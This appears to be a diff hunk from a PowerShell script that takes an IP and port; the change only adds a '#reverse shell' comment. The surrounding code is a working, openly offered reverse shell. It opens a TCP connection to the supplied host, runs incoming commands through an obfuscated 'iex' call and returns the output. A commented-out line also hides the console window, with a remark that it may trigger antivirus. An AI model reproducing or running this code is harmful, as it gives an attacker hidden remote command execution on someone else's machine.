@@ -5,6 +5,7 @@ param([string]$ip,[string]$port)
 #optional add below code to $code's fist line before the reverse shell to auto hide window, might trigger AV though
 #Add-Type -name y -names x -m '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr a, Int32 b);';[x.y]::ShowWindow([x.y]::GetConsoleWindow(), 0)
 
+#reverse shell
 $code=@'
 $x=(New-Object System.Net.Sockets.TCPClient("~",^)).getstream();[byte[]]$b=0..65535|%{0};while(($i=$x.Read($b,0,$b.Length))-ne 0){$d=([text.encoding]::ASCII).GetBytes(((i''ex((New-Object -t System.Text.ASCIIEncoding).GetString($b,0,$i))2>&1|Out-String)+(pwd).Path+"> "));$x.Write($d,0,$d.Length);$x.Flush()}
 '@ -replace '~',$ip -replace '\^',$port
